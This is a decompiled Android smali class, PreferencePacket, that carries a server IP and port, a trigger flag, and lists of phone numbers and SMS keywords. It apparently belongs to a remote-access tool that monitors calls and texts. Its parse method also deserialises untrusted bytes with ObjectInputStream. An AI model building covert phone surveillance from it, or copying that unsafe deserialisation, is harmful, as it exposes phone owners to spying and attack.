.class public LPacket/PreferencePacket;
.super Ljava/lang/Object;
.source "PreferencePacket.java"

# interfaces
.implements LPacket/Packet;
.implements Ljava/io/Serializable;


# static fields
.field private static final serialVersionUID:J = 0xfc14e688b5377L


# instance fields
.field ip:Ljava/lang/String;

.field keywordSMS:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field phoneNumberCall:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field phoneNumberSMS:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field port:I

.field waitTrigger:Z


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 41
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 43
    return-void
.end method

.method public constructor <init>(Ljava/lang/String;IZLjava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V
    .locals 0
    .parameter "ip"
    .parameter "port"
    .parameter "wait"
    .parameter
    .parameter
    .parameter
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "IZ",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 45
    .local p4, phones:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .local p5, sms:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .local p6, kw:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 46
    iput-object p1, p0, LPacket/PreferencePacket;->ip:Ljava/lang/String;

    .line 47
    iput p2, p0, LPacket/PreferencePacket;->port:I

    .line 48
    iput-boolean p3, p0, LPacket/PreferencePacket;->waitTrigger:Z

    .line 49
    iput-object p4, p0, LPacket/PreferencePacket;->phoneNumberCall:Ljava/util/ArrayList;

    .line 50
    iput-object p5, p0, LPacket/PreferencePacket;->phoneNumberSMS:Ljava/util/ArrayList;

    .line 51
    iput-object p6, p0, LPacket/PreferencePacket;->keywordSMS:Ljava/util/ArrayList;

    .line 52
    return-void
.end method


# virtual methods
.method public build()[B
    .locals 4

    .prologue
    .line 56
    :try_start_0
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 57
    .local v0, bos:Ljava/io/ByteArrayOutputStream;
    new-instance v2, Ljava/io/ObjectOutputStream;

    invoke-direct {v2, v0}, Ljava/io/ObjectOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 58
    .local v2, out:Ljava/io/ObjectOutputStream;
    invoke-virtual {v2, p0}, Ljava/io/ObjectOutputStream;->writeObject(Ljava/lang/Object;)V

    .line 59
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    .line 61
    .end local v0           #bos:Ljava/io/ByteArrayOutputStream;
    .end local v2           #out:Ljava/io/ObjectOutputStream;
    :goto_0
    return-object v3

    .line 60
    :catch_0
    move-exception v1

    .line 61
    .local v1, e:Ljava/io/IOException;
    const/4 v3, 0x0

    goto :goto_0
.end method

.method public getIp()Ljava/lang/String;
    .locals 1

    .prologue
    .line 82
    iget-object v0, p0, LPacket/PreferencePacket;->ip:Ljava/lang/String;

    return-object v0
.end method

.method public getKeywordSMS()Ljava/util/ArrayList;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 122
    iget-object v0, p0, LPacket/PreferencePacket;->keywordSMS:Ljava/util/ArrayList;

    return-object v0
.end method

.method public getPhoneNumberCall()Ljava/util/ArrayList;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 106
    iget-object v0, p0, LPacket/PreferencePacket;->phoneNumberCall:Ljava/util/ArrayList;

    return-object v0
.end method

.method public getPhoneNumberSMS()Ljava/util/ArrayList;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 114
    iget-object v0, p0, LPacket/PreferencePacket;->phoneNumberSMS:Ljava/util/ArrayList;

    return-object v0
.end method

.method public getPort()I
    .locals 1

    .prologue
    .line 90
    iget v0, p0, LPacket/PreferencePacket;->port:I

    return v0
.end method

.method public isWaitTrigger()Z
    .locals 1

    .prologue
    .line 98
    iget-boolean v0, p0, LPacket/PreferencePacket;->waitTrigger:Z

    return v0
.end method

.method public parse([B)V
    .locals 4
    .parameter "packet"

    .prologue
    .line 66
    new-instance v0, Ljava/io/ByteArrayInputStream;

    invoke-direct {v0, p1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    .line 69
    .local v0, bis:Ljava/io/ByteArrayInputStream;
    :try_start_0
    new-instance v1, Ljava/io/ObjectInputStream;

    invoke-direct {v1, v0}, Ljava/io/ObjectInputStream;-><init>(Ljava/io/InputStream;)V

    .line 70
    .local v1, in:Ljava/io/ObjectInputStream;
    invoke-virtual {v1}, Ljava/io/ObjectInputStream;->readObject()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, LPacket/PreferencePacket;

    .line 71
    .local v2, p:LPacket/PreferencePacket;
    invoke-virtual {v2}, LPacket/PreferencePacket;->getIp()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, LPacket/PreferencePacket;->setIp(Ljava/lang/String;)V

    .line 72
    invoke-virtual {v2}, LPacket/PreferencePacket;->getPort()I

    move-result v3

    invoke-virtual {p0, v3}, LPacket/PreferencePacket;->setPort(I)V

    .line 73
    invoke-virtual {v2}, LPacket/PreferencePacket;->isWaitTrigger()Z

    move-result v3

    invoke-virtual {p0, v3}, LPacket/PreferencePacket;->setWaitTrigger(Z)V

    .line 74
    invoke-virtual {v2}, LPacket/PreferencePacket;->getPhoneNumberCall()Ljava/util/ArrayList;

    move-result-object v3

    invoke-virtual {p0, v3}, LPacket/PreferencePacket;->setPhoneNumberCall(Ljava/util/ArrayList;)V

    .line 75
    invoke-virtual {v2}, LPacket/PreferencePacket;->getPhoneNumberSMS()Ljava/util/ArrayList;

    move-result-object v3

    invoke-virtual {p0, v3}, LPacket/PreferencePacket;->setPhoneNumberSMS(Ljava/util/ArrayList;)V

    .line 76
    invoke-virtual {v2}, LPacket/PreferencePacket;->getKeywordSMS()Ljava/util/ArrayList;

    move-result-object v3

    invoke-virtual {p0, v3}, LPacket/PreferencePacket;->setKeywordSMS(Ljava/util/ArrayList;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 79
    .end local v1           #in:Ljava/io/ObjectInputStream;
    .end local v2           #p:LPacket/PreferencePacket;
    :goto_0
    return-void

    .line 77
    :catch_0
    move-exception v3

    goto :goto_0
.end method

.method public setIp(Ljava/lang/String;)V
    .locals 0
    .parameter "ip"

    .prologue
    .line 86
    iput-object p1, p0, LPacket/PreferencePacket;->ip:Ljava/lang/String;

    .line 87
    return-void
.end method

.method public setKeywordSMS(Ljava/util/ArrayList;)V
    .locals 0
    .parameter
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 126
    .local p1, keywordSMS:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    iput-object p1, p0, LPacket/PreferencePacket;->keywordSMS:Ljava/util/ArrayList;

    .line 127
    return-void
.end method

.method public setPhoneNumberCall(Ljava/util/ArrayList;)V
    .locals 0
    .parameter
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 110
    .local p1, phoneNumberCall:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    iput-object p1, p0, LPacket/PreferencePacket;->phoneNumberCall:Ljava/util/ArrayList;

    .line 111
    return-void
.end method

.method public setPhoneNumberSMS(Ljava/util/ArrayList;)V
    .locals 0
    .parameter
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 118
    .local p1, phoneNumberSMS:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    iput-object p1, p0, LPacket/PreferencePacket;->phoneNumberSMS:Ljava/util/ArrayList;

    .line 119
    return-void
.end method

.method public setPort(I)V
    .locals 0
    .parameter "port"

    .prologue
    .line 94
    iput p1, p0, LPacket/PreferencePacket;->port:I

    .line 95
    return-void
.end method

.method public setWaitTrigger(Z)V
    .locals 0
    .parameter "waitTrigger"

    .prologue
    .line 102
    iput-boolean p1, p0, LPacket/PreferencePacket;->waitTrigger:Z

    .line 103
    return-void
.end method
